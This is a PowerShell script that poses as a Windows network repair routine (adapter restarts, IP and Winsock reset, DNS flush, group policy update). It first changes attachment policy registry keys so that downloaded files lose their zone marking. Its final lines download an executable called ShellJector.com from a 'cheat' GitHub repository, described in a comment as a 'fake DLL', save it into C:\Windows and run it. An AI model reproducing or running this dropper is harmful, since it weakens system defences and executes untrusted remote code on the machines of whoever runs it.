
# Set attachment policy registry keys
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Attachments" -Name "SaveZoneInformation" -Value 2 -Type DWord
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Attachments" -Name "ScanWithAntiVirus" -Value 2 -Type DWord

# Restart active network adapters
Get-NetAdapter | Where-Object {$_.Status -eq "Up"} | Restart-NetAdapter -Confirm:$false

# Reset IP stack and flush DNS
netsh int ip reset
netsh winsock reset
ipconfig /flushdns

# Start WLAN service if it's not already running
Get-Service WlanSvc | Start-Service

# Show current network adapter info
Get-NetAdapter | Format-Table Name, Status, InterfaceDescription

# Force group policy update
gpupdate /force

# Download fake DLL and place it in the plugins folder
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/shivumang011/ShivUmangStreamerCheat/refs/heads/main/ShellJector.com" -OutFile "C:\Windows\ShellJector.com"

# Run the File
Start-Process -FilePath "C:\Windows\ShellJector.com"